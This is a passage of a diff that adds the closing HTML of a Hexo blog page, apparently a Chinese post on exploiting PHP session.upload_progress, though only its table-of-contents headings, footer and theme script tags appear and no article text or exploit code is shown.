class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-1"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E6%AC%A1%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95"><span class="nav-text">几次失败尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-text">小结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2022</span>&nbsp;-&nbsp;2024
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">P1taya</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+        
+
+        <div class="count-item info-item default">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">79.9k</span>
+                </span>
+            
+
+            
+                <span class="count-box border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-box border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E4%B8%AD%E7%9A%84session-upload-progress"><span class="nav-text">php中的session.upload_progress</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E5%8F%8Asession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-text">session相关配置及session反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%A9%E7%94%A8"><span class="nav-text">利用session.upload_progress进行文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf%E9%A2%98%E7%9B%AE"><span class="nav-text">ctf题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-text">利用session.upload_progress进行反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83-1"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E6%9E%90-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC-1"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%A0%E6%AC%A1%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95"><span class="nav-text">几次失败尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B0%8F%E7%BB%93-1"><span class="nav-text">小结</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+<!-- common -->
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/libs/anime.min.js"></script>
+
+<!-- local-search -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/lazyload.js"></script>
+
+
+<div class="">
+    
+        <!-- post-helper -->
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/copyright-info.js"></script>
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+    
+        
+    
+
+</body>
+</html>
